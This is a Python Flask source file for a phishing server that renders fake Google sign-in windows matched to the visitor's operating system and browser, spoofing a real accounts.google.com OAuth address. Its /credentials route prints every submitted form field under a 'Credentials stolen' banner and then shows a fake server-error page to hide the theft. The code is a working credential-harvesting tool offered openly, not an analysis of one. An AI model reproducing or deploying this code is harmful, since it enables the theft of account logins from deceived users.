import base64
from flask import Flask, request, render_template

GOOGLE_DOMAIN = "https://accounts.google.com/"
GOOGLE_PATH = "o/oauth2/v2/auth/identifier?client_id=438567566819-3k1nk9qd1vr39c42rmjr0dh24ngth0s4.apps.googleusercontent.com&response_type=code&scope=openid%20email%20profile&redirect_uri=https%3A%2F%2FwifiAP.com%2Fggcallback.htm&state=-4680848713992279421&flowName=GeneralOAuthFlow"
app = Flask(__name__)

@app.route('/')
def home_function():
    server_base = "127.0.0.1:5000"
    return render_template("/html/index.html", server_base=server_base, title="Hello world")

@app.route('/login.php', methods=['GET'])
def init_page():
    browser_mode = request.args.get('window_mode')
    user_lang = request.args.get('language')
    user_browser = request.args.get("browser")
    user_os = request.args.get("os")

    css_tag = "<link rel=\"stylesheet\" href=\"static/css/{}/{}/{}/style.css\">".format(user_os, user_browser, browser_mode)
    script_tag = "<script src=\"static/js/{}/{}/{}/script.js\"></script>".format(user_os, user_browser, browser_mode)
    window_google_frame = render_template("login_window/{}/{}/window.html".format(user_os, user_browser), type="google", logo="static/images/google_logo.svg", domain=GOOGLE_DOMAIN, path=GOOGLE_PATH, phishing_link="http://{}/google".format("127.0.0.1:5000"), title="Google Sign In")
    window_facebook_frame = ""
    window_microsoft_frame = ""

    return render_template("html/fake_page/login.html", css_tag=css_tag, script_tag=script_tag, window_google_frame=window_google_frame, window_facebook_frame=window_facebook_frame, window_microsoft_frame=window_microsoft_frame)

@app.route("/google", methods=['GET'])
def google_login_page():
    return render_template("login_pages/google/index.html")


    


@app.route('/credentials', methods=['POST'])
def get_credentials():
    print("------------- Credentials stolen --------------")
    for field in request.form:
        print("{}: {}".format(field, request.form.get(field)))

    return "<H1>Internal Server Error</H1><p>The server encountered an internal error or misconfiguration and was unable to complete your request</p><p>Please contact the server administrator to inform them this error ocurred, and the actions you performed just before this error</p>"




